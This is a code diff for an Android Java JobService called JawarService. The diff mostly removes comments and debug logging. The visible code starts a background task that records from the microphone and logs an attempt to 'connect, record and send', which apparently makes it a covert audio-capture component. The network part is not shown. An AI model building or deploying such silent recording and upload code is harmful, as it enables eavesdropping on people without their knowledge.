@@ -1,7 +1,7 @@
 package eu.davidriff.jawar;
 
 /**
- * Created by doctor on 12/04/17.
+ * Created by David Riff on 12/04/17.
  */
 
 
@@ -11,8 +11,7 @@ import android.os.AsyncTask;
 import java.io.*;
 import java.net.*;
 import android.media.MediaRecorder;
-import android.widget.Toast;
-import android.os.*;
+
 
 public class JawarService extends JobService{
 
@@ -24,7 +23,7 @@ public class JawarService extends JobService{
     @Override
     public boolean onStartJob(JobParameters params) {
         // Note: this is preformed on the main thread.
-        //Log.d(TAG, "onStartJob id=" + params.getJobId());
+
         updateTask.execute(params);
 
         return true;
@@ -36,7 +35,6 @@ public class JawarService extends JobService{
     public boolean onStopJob(JobParameters params) {
         // Note: return true to reschedule this job.
 
-        //Log.d(TAG, "onStopJob id=" + params.getJobId());
         boolean shouldReschedule = updateTask.stopJob(params);
 
         return shouldReschedule;
@@ -50,11 +48,7 @@ public class JawarService extends JobService{
         @Override
         protected JobParameters[] doInBackground(JobParameters... params) {
 
-            // Do updating and stopping logical here.
-
-
             System.out.println("Trying to connect, record and send...");
-            //AÑADIDO
 
             try {
 
@@ -63,7 +57,7 @@ public class JawarService extends JobService{
 
 
 
-                    //Recorder here
+                    //Recorder
                     MediaRecorder mediaRecorder = new MediaRecorder();
                     mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                     //mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
@@ -113,13 +107,6 @@ public class JawarService extends JobService{
 
             System.out.println("Done !");
 
-            //FIN DE AÑADIDO
-
-
-
-
-
-            //Log.d(TAG, "Updating apps in the background");
             return params;
         }
 
@@ -127,7 +114,6 @@ public class JawarService extends JobService{
         protected void onPostExecute(JobParameters[] result) {
             for (JobParameters params : result) {
                 if (!hasJobBeenStopped(params)) {
-                    //Log.d(TAG, "finishing job with id=" + params.getJobId());
                     jobFinished(params, false);
                 }
             }
@@ -139,7 +125,6 @@ public class JawarService extends JobService{
         }
 
         public boolean stopJob(JobParameters params) {
-            //Log.d(TAG, "stopJob id=" + params.getJobId());
             // Logic for stopping a job. return true if job should be rescheduled.
             return false;
         }
